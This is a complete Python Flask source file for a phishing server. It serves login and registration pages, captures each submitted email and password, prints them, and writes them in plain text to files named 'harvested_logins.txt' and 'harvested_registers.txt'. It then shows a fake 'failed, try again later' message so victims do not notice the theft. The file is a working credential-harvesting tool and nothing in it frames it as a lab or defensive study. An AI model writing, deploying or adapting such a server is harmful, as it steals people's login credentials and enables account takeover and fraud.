from flask import Flask, request, render_template
from datetime import datetime
import os

app = Flask(__name__)

# Auto-create files with header line if not exist
for file in ['harvested_logins.txt', 'harvested_registers.txt']:
    if not os.path.exists(file):
        with open(file, 'w') as f:
            f.write("timestamp | email:password\n")

def harvest_credentials(source, email, password):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"[{source.upper()}] {email}:{password}")
    with open(f"harvested_{source}s.txt", "a") as f:
        f.write(f"{timestamp} | {email}:{password}\n")

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')
        harvest_credentials('login', email, password)
        return "<h3>Login failed. Please try again later.</h3>"
    return render_template('login.html')

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')
        harvest_credentials('register', email, password)
        return "<h3>Registration failed. Please try again later.</h3>"
    return render_template('register.html')

@app.route('/')
def home():
    return render_template('index.html')

if __name__ == '__main__':
    app.run(port=5001, debug=True)
